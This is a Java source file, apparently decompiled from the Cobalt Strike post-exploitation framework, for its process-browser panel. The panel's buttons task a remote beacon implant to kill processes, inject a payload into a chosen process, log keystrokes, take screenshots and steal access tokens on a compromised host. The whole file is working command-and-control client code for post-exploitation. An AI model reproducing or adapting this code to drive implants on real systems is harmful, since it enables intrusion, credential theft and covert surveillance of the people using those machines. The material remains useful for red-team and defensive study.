package aggressor.windows;

import aggressor.AggressorClient;
import aggressor.dialogs.ScListenerChooser;
import beacon.TaskBeacon;
import common.AObject;
import common.CommonUtils;
import console.AssociatedPanel;
import dialog.DialogUtils;
import dialog.SafeDialogCallback;
import dialog.SafeDialogs;

import java.awt.BorderLayout;
import java.awt.event.ActionEvent;
import java.awt.event.ActionListener;
import javax.swing.JButton;
import javax.swing.JComponent;
import javax.swing.JSeparator;

public class ProcessBrowser extends AObject implements ActionListener {

    protected String bid = "";

    protected AggressorClient client = null;

    protected Processes browser = null;

    public ProcessBrowser(AggressorClient aggressorClient, String string) {
        this.client = aggressorClient;
        this.bid = string;
        this.browser = new Processes(aggressorClient, string);
    }

    public void actionPerformed(ActionEvent actionEvent) {
        String str = actionEvent.getActionCommand();
        if ("Kill".equals(str)) {
            final Object[] all = browser.getSelectedPIDs();
            final TaskBeacon tasker = new TaskBeacon(client, client.getData(), client.getConnection(), new String[]{bid});
            for (int i = 0; i < all.length; i++) {
                tasker.input("kill " + all[i]);
                tasker.Kill(Integer.parseInt(all[i] + ""));
            }
            tasker.Pause(500);
            browser.refresh();
        } else if ("Refresh".equals(str)) {
            browser.refresh();
        } else if ("Inject".equals(str)) {
            ScListenerChooser.ListenersAll(client, new SafeDialogCallback() {
                public void dialogResult(String string) {
                    TaskBeacon taskBeacon = new TaskBeacon(client, client.getData(), client.getConnection(), new String[]{bid});
                    Object[][] arrobject = browser.getSelectedValuesFromColumns(CommonUtils.toArray("PID, Arch"));
                    for (int i = 0; i < arrobject.length; i++) {
                        int n = Integer.parseInt(arrobject[i][0] + "");
                        String str = arrobject[i][1] + "";
                        taskBeacon.input("inject " + n + " " + str + " " + string);
                        taskBeacon.Inject(n, string, str);
                    }
                }
            }).show();
        } else if ("Log Keystrokes".equals(str)) {
            final TaskBeacon tasker = new TaskBeacon(client, client.getData(), client.getConnection(), new String[]{bid});
            final Object[][] all = browser.getSelectedValuesFromColumns(CommonUtils.toArray("PID, Arch"));
            for (int i = 0; i < all.length; i++) {
                int n = Integer.parseInt(all[i][0] + "");
                String str1 = all[i][1] + "";
                tasker.input("keylogger " + n + " " + str1);
                tasker.KeyLogger(n, str1);
            }
            DialogUtils.showInfo("Tasked Beacon to log keystrokes");
        } else if ("Screenshot".equals(str)) {
            final TaskBeacon tasker = new TaskBeacon(client, client.getData(), client.getConnection(), new String[]{bid});
            final Object[][] all = browser.getSelectedValuesFromColumns(CommonUtils.toArray("PID, Arch"));
            SafeDialogs.ask("Take screenshots for X seconds:", "0", new SafeDialogCallback() {
                public void dialogResult(String string) {
                    int num = CommonUtils.toNumber(string, 0);
                    for (int i = 0; i < all.length; i++) {
                        int j = Integer.parseInt(all[i][0] + "");
                        String str = all[i][1] + "";
                        tasker.input("screenshot " + j + " " + str + " " + num);
                        tasker.Screenshot(j, str, num);
                    }
                    DialogUtils.showInfo("Tasked Beacon to take screenshot");
                }
            });
        } else if ("Steal Token".equals(str)) {
            final Object[] all = browser.getSelectedPIDs();
            final TaskBeacon tasker = new TaskBeacon(client, client.getData(), client.getConnection(), new String[]{bid});
            for (int i = 0; i < all.length; i++) {
                tasker.input("steal_token " + all[i]);
                tasker.StealToken(Integer.parseInt(all[i] + ""));
            }
            DialogUtils.showInfo("Tasked Beacon to steal a token");
        }
    }

    public JButton Button(String string) {
        JButton jButton = new JButton(string);
        jButton.addActionListener(this);
        return jButton;
    }

    public JComponent getContent() {
        AssociatedPanel associatedPanel = new AssociatedPanel(bid);
        associatedPanel.setLayout(new BorderLayout());
        JButton jButton1 = Button("Kill");
        JButton jButton2 = Button("Refresh");
        JSeparator jSeparator1 = new JSeparator();
        JButton jButton3 = Button("Inject");
        JButton jButton4 = Button("Log Keystrokes");
        JButton jButton5 = Button("Screenshot");
        JButton jButton6 = Button("Steal Token");
        JSeparator jSeparator2 = new JSeparator();
        JButton jButton7 = Button("Help");
        jButton7.addActionListener(
                DialogUtils.gotoURL("https://www.cobaltstrike.com/help-process-browser"));
        associatedPanel.add(browser.setup(), "Center");
        associatedPanel.add(DialogUtils.center(jButton1, jButton2, jSeparator1, jButton3,
                jButton4, jButton5, jButton6, jSeparator2, jButton7), "South");
        return associatedPanel;
    }
}
